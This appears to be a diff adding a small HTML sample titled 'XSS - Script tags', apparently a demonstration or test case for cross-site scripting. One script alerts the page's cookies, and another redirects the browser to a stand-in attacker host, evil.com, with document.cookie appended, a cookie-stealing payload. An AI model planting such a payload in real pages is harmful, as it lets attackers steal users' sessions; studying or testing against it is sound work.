@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS - Script tags</title>
+</head>
+<body>
+    <script>
+        alert('This is Javascript within a script tag accessing cookies: ' + document.cookie);
+    </script>
+    <script>
+        window.location = 'http://www.evil.com/?cookie=' + document.cookie;
+    </script>
+    <a>
+    </a>
+</body>
+</html>
